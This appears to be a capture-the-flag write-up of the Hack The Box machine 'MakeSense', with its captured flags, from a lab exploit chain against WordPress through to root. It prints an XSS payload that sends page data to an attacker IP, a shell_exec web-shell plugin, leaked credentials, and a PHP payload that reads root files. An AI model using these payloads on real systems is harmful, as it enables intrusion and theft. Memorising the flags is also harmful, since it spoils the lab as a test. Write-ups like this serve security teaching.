# Hack The Box — MakeSense

- **Target:** 10.129.27.192 (`makesense.htb`)
- **OS:** Linux
- **Difficulty:** Medium
- **Date:** 2026-07-08
- **Result:** Owned (user + root)

| Flag | Value |
|------|-------|
| user.txt | `bca5b08c5f2ea0514b917be13e3ae5c6` |
| root.txt | `85455eb3e06b30e5f8ed2dd3afcb104a` |

---

## Key facts

| # | Fact | Value |
|---|------|-------|
| 1 | Open TCP ports | 22, 443 |
| 2 | Web stack | Apache 2.4.58, WordPress 7.0, custom `webagency` theme |
| 3 | Initial vulnerability | Stored XSS in encrypted contact/voice submission results |
| 4 | Foothold | WordPress admin creation, plugin upload RCE |
| 5 | User pivot | `wp-config.php` credential reuse to `walter` |
| 6 | Root vector | Root-owned localhost OCR service writes executable PHP |

---

## Chain

`makesense.htb:443` WordPress WebAgency site → exposed AES-GCM key in theme JavaScript → unauthenticated `submit_contact_form` and `save_voice_results` AJAX flow → stored XSS in admin contact-submission list → create temporary WordPress administrator → upload plugin for RCE as `www-data` → read `wp-config.php` and reuse `walter` password over SSH → authenticate to root-owned OCR service on `127.0.0.1:8001` → save recognized PHP into `/root/ocr4/saved/` → execute PHP as root and read `root.txt`.

---

## 1. Enumeration

The full TCP sweep showed a very small external surface:

```bash
nmap -Pn -p- --min-rate 5000 10.129.27.192
```

```text
22/tcp   open      ssh
80/tcp   filtered  http
443/tcp  open      https
8001/tcp filtered  vcom-tunnel
```

Service detection identified Apache and WordPress:

```text
22/tcp  OpenSSH 9.6p1 Ubuntu
443/tcp Apache/2.4.58 (Ubuntu)
ssl-cert CN=makesense.htb
http-title: Agency LLC
http-generator: WordPress 7.0
```

The page source loaded a custom theme and two interesting JavaScript files:

```text
/wp-content/themes/webagency/assets/js/whisper/whisper-wrapper.js
/wp-content/themes/webagency/assets/js/main.js
```

The WordPress REST API exposed one public user, `admin`, and a custom post type:

```text
/wp/v2/contact_submission
```

---

## 2. Foothold — encrypted contact results to stored XSS

The `whisper-wrapper.js` file disclosed the symmetric key used to encrypt contact transcription and summary results before sending them to WordPress:

```javascript
const ENCRYPTION_KEY = 'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI';
```

The main theme script showed the unauthenticated AJAX actions:

```text
submit_contact_form
save_voice_results
```

The first action created a public `contact_submission` post and returned a `post_id`. The second action accepted an AES-GCM encrypted JSON payload and attached decrypted transcription/summary fields to that post.

Because the key was client-side, we could generate our own encrypted payload:

```javascript
{
  "transcription": "<img src=x onerror=\"fetch('http://10.10.16.175:8000/xss?loc='+encodeURIComponent(location.href))\">",
  "summary": "<img src=x onerror=\"fetch('http://10.10.16.175:8000/xss?loc='+encodeURIComponent(location.href))\">"
}
```

When the admin review process opened the contact-submission list, the payload executed from:

```text
https://makesense.htb/wp-admin/edit.php?post_type=contact_submission
```

The cookies were HttpOnly, so stealing the session was not useful. Instead, the XSS performed same-origin admin actions directly. It fetched `/wp-admin/user-new.php`, parsed `_wpnonce_create-user`, and posted a new administrator account.

The callback confirmed the user creation:

```text
/wp-admin/users.php?update=add&id=5
```

---

## 3. WordPress admin to RCE

With the temporary administrator, plugin upload was enabled at:

```text
/wp-admin/plugin-install.php?tab=upload
```

A minimal plugin was uploaded and activated:

```php
<?php
/*
Plugin Name: MakeSense Evidence Runner
*/

add_action('init', function () {
    if (!isset($_GET['codex_cmd']) || ($_GET['token'] ?? '') !== 'mks-20260708') {
        return;
    }
    header('Content-Type: text/plain');
    echo shell_exec((string) $_GET['codex_cmd'] . ' 2>&1');
    exit;
});
```

Command execution landed as the web user:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
makesense.htb
/var/www/html
```

---

## 4. User — credential reuse to SSH

Reading `wp-config.php` showed SQLite configuration, but also leaked a reusable system credential:

```php
define( 'DB_USER', 'walter' );
define( 'DB_PASSWORD', 'JbhHDAEgXvri3!' );
```

That password worked over SSH:

```bash
ssh walter@10.129.27.192
```

The user flag was readable in Walter's home directory:

```text
/home/walter/user.txt
bca5b08c5f2ea0514b917be13e3ae5c6
```

---

## 5. Root — OCR service writes PHP as root

Local process enumeration as `walter` revealed a root-owned PHP development server:

```text
root php -S 127.0.0.1:8001 -t /root/ocr4/
```

The service required Basic Auth, and Walter's SSH password also unlocked it:

```bash
curl -u 'walter:JbhHDAEgXvri3!' http://127.0.0.1:8001/
```

The web app provided a canvas, submitted `canvas_image` as a base64 PNG, ran Tesseract, then offered to save the recognized text:

```html
<input type="hidden" name="ocr_id" value="ocr_...">
<input type="text" name="filename" placeholder="result.txt" required>
```

Saving a normal OCR result wrote it under a web-reachable directory:

```text
Saved as: saved/codex-test.txt
```

Path traversal was reduced with `basename()`, but extension filtering was missing. Since the server was PHP and running as root, saving a recognized payload as `.php` gave root code execution.

I generated an image containing:

```php
<?php readfile('/root/root.txt');?>
```

Tesseract recognized it cleanly. Saving it as `codex-root.php` produced:

```text
Saved as: saved/codex-root.php
```

Requesting that file through the root-owned PHP service executed it and returned the root flag:

```text
85455eb3e06b30e5f8ed2dd3afcb104a
```

---

## Cleanup

After capture, the temporary contact submissions, WordPress administrator account, and uploaded plugin were removed. The root proof PHP file in the OCR app was overwritten with benign text.

---

## Fixes

- Do not ship encryption keys in client-side JavaScript when the server treats decrypted content as trusted.
- Enforce authentication and authorization on contact result update actions.
- Escape decrypted transcription and summary fields before rendering them in WordPress admin views.
- Isolate admin review bots from privileged WordPress sessions.
- Disable plugin upload/editor access for routine admins.
- Remove credential reuse between WordPress configuration, SSH, and internal services.
- Do not run internal PHP tooling as root.
- Store OCR output outside the executable web root and force a safe extension such as `.txt`.
